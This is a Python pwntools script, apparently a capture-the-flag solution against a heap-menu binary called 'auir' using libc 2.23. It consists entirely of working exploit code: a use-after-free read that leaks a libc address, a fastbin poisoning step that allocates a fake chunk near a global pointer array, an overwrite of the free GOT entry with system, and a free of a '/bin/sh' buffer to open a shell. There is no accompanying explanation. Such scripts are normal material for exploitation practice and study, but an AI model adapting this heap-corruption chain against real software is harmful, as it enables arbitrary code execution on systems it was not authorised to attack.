from pwn import *

target = process('./auir', env={"LD_PRELOAD":"./libc-2.23.so"})
elf = ELF('./auir')
libc = ELF('./libc-2.23.so')
# gdb.attach(target)

def makeZealot(size, content):
    target.recvuntil('>>')
    target.sendline('1')
    target.recvuntil('>>')
    target.sendline(str(size))
    target.recvuntil('>>')
    target.send(content)

def destroyZealot(index):
    target.recvuntil('>>')
    target.sendline('2')
    target.recvuntil('>>')
    target.sendline(str(index))

def fixZealot(index, size, content):
    target.recvuntil('>>')
    target.sendline('3')
    target.recvuntil('>>')
    target.sendline(str(index))
    target.recvuntil('>>')
    target.sendline(str(size))
    target.recvuntil('>>')
    target.send(content)

def showZealot(index):
    target.recvuntil('>>')
    target.sendline('4')
    target.recvuntil('>>')
    target.sendline(str(index))

makeZealot(0xf0, "0"*0xf0)
makeZealot(0x70, "1"*0x70)
makeZealot(0xf0, "2"*0xf0)
makeZealot(0x30, "3"*0x30)
destroyZealot(3)
destroyZealot(2)
showZealot(2)
target.recvuntil("[*]SHOWING....\n")
leak = target.recvuntil("|").strip("|")
leak = u64(leak + "\x00" * (8-len(leak)))
libcBase = leak - 0x3c4b78
print("libc base: " + hex(libcBase))
fakeChunk = 0x605310 - 0x23
makeZealot(0x60, "1"*0x60)
makeZealot(0x60, "2"*0x60)
destroyZealot(4)
destroyZealot(5)
fixZealot(5, 0x60, p64(fakeChunk) + p64(0) + "0"*80)
makeZealot(0x60, "6"*0x60)
makeZealot(0x60, "0")
fixZealot(7, 0x1b, "0"*0x13 + p64(elf.got['free']))
fixZealot(0, 0x8, p64(libcBase + libc.symbols['system']))
fixZealot(1, 0x9, "/bin/sh\x00")
destroyZealot(1)
target.interactive()
